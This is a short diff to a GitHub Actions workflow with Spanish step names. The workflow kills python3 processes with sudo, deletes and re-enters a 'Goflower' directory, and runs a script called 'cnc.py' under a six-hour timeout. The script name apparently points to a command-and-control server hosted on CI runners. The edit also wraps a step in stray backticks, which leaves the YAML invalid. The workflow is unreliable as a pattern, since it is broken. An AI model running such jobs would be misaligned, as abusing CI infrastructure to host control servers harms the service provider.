@@ -11,9 +11,10 @@ jobs:
     timeout-minutes: 360
 
     steps:
-    - name: Limpiar directorio anterior
+    ` - name: Limpiar directorio anterior
       run: |
-        sudo killall -9 python3 2>/dev/null || true
+        rm -rf Goflower>/dev/null || true
+        sudo killall -9 python3 2>/dev/null || true`
 
     - name: Clonar repositorio
       run: |
@@ -29,4 +30,5 @@ jobs:
 
     - name: Ejecutar cnc.py
       run: |
+        cd Goflower
         python3 cnc.py
